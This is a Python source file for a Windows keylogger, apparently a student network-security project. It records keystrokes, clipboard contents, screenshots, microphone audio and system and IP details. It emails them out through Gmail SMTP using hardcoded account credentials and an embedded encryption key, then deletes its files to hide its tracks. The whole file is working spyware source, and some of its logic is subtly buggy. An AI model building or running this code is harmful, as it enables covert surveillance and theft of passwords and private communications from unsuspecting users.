#All Libraries
#libraries for smtp server for sending E-mail
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#To get Computer information
import socket
import platform

#Library to capture keystrokes and screenshots
import win32clipboard
from pynput.keyboard import Key, Listener
import os

import getpass
import time

#To read and write file
from scipy.io.wavfile import write

#To accesss microphone of system
import sounddevice as sd

#To encrypt file 
from cryptography.fernet import Fernet

from requests import get

from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

m = int(input("Enter time for Microphone ecording (in sec.):\n")) 
microphone_time = m
a = int(input("Enter val in sec for much time you want to run Keylogger:\n"))
time_iteration = a
n = int(input("How many time you want to run Keylogger:\n"))
number_of_iterations_end = n

email_address = "advakeylogger@gmail.com" # Enter disposable email here
password = "advakeylogger12345" # Enter email password here

username = getpass.getuser()

e = str(input("Enter your E-mail ID:\n")) 
toaddr = e # Enter the email address you want to send your information to

key = "3K0jJcLznUeLRYdUF5CNLcx2MzX7jHlArMoa6CSZCMw=" # Generate an encryption key from the Cryptography folder

file_path = "D:\\Notes\\5th Semester\\Network Security Mini project\\Keylogger" # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

# email controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")



# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

screenshot()
copy_clipboard()
microphone()

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                newkey = str(key).replace("'", "")

                if newkey.find('backspace') > 0:
                    newkey[:-1]
                elif newkey.find('space') > 0:
                    f.write(' ')
                elif newkey.find('enter') > 0:
                    f.write('\n')
                elif newkey.find('Key') == -1:
                    f.write(newkey)

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        microphone()
        send_email(audio_information, file_merge + audio_information, toaddr)

        copy_clipboard()
        send_email(clipboard_information_e, file_merge + clipboard_information_e, toaddr)

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)